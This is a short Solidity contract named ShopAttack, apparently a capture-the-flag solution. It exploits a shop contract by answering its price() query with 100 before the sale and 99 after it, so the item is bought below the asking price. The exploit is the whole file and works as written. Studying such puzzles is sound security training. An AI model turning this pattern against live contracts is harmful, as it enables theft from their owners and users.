pragma solidity ^0.8.0;

interface ShopInterface {
    function isSold() external view returns (bool);
    function price() external view returns (uint256);
    function buy() external;
}

contract ShopAttack {

    bool public isAttack = true;
    ShopInterface public shop;

    constructor(address _shop) {
        shop = ShopInterface(_shop);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 99;
        } else {
            return 100;
        }
    }

    function attack() external {
        shop.buy();
    }
}
